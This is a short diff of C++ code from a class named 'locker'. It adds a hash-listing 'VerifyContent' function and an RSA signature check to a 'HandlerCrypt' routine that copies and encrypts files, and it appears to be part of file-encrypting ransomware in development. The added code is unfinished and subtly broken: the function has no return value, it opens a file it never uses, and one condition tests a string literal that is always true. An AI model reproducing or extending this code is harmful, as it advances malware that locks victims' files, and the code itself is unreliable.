@@ -112,8 +112,31 @@ BOOL locker::HandlerASymmetricGenKey()
 	return TRUE;
 }
 
-BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs)
+
+
+BOOL locker::VerifyContent(SLIST<locker::HLIST>* HashList)
 {
+	WCHAR* locale = (WCHAR*)memory::m_malloc(MAX_PATH * sizeof(WCHAR));
+	GetCurrentDirectoryW(MAX_PATH, locale);
+	wmemcpy_s(&locale[memory::StrLen(locale)], 16, L"\\signature.laced", 16);
+	HANDLE hFile = CreateFileW(locale, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
+
+	PHLIST DataHash = NULL;
+	SLIST_FOREACH(DataHash, HashList)
+	{
+		printf_s("\t%s\n", DataHash->hash);
+	}
+
+	// идея - вычислиь все хэши в  HandlerCrypt (создать лист) а дальше уже создать файл сигнатура(подпись) каким-то методом
+}
+
+
+BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs, SLIST<HLIST>* HashList)
+{
+	if ("VerifyTRUE" && HashList != NULL)
+	{
+		filesystem::VerifySignatureRSA();
+	}
 	WCHAR* newFilename = filesystem::MakeCopyFile(Path, Filename, Exs, FPAth);
 	
 	if (global::GetEncrypt() == SYMMETRIC)
